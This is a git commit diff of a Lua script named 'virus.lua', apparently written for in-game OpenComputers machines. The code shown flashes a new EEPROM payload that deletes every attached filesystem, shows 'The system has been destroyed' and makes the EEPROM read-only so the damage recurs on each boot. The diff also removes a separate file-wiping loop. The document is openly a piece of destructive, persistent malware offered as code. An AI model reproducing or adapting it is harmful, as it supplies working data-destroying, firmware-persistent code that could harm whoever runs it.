9eb656ee21864e7fbea0c25e5046103c3989b363
Michael Amudeshnikov <83592338+misha99fr@users.noreply.github.com>
2024-08-09 16:26:48 +0300

    sigma

--- virus.lua
+++ virus.lua
@@ -6,10 +6,6 @@ eeprom.setData("xD")
 eeprom.set([=[component=component or require("component")a=component.list("gpu")()for b in component.list("filesystem")do component.invoke(b,"remove","/")end;if a then computer=computer or require("computer")c=component and component.gpu or component.proxy(a)if c.getScreen()==""then c.bind(component.list("screen")())end;if c.getScreen()~=""then d,e=c.getResolution()f,g=d/2,e/2;h={"     ◢█◣","    ◢███◣","   ◢█████◣","  ◢███████◣"," ◢█████████◣","◢███████████◣"}i={"█","█","█","","▀"}j=math.ceil(f-6)k=math.ceil(g-7)c.setBackground(0x000000)c.setForeground(0xff0000)c.fill(1,1,d,e," ")for l=1,#h do c.set(j,l+k,h[l])end;c.setBackground(0xff0000)c.setForeground(0xffffff)for l=1,#i do c.set(j+6,k+l+1,i[l])end;c.setBackground(0x000000)c.setForeground(0xffffff)c.set(math.floor(f-14),g+3,"The system has been destroyed")c.set(math.floor(f-15),g+5,"Press power button to shutdown")while true do computer.pullSignal(math.huge)end end end]=])
 eeprom.makeReadonly(eeprom.getChecksum())
 
-for filesystem in component.list("filesystem") do 
-    component.invoke(filesystem, "remove", "/")
-end
-
 if gpuTest then
 	local computer = computer or require("computer")
 	local gpu = component and component.gpu or component.proxy(gpuTest)
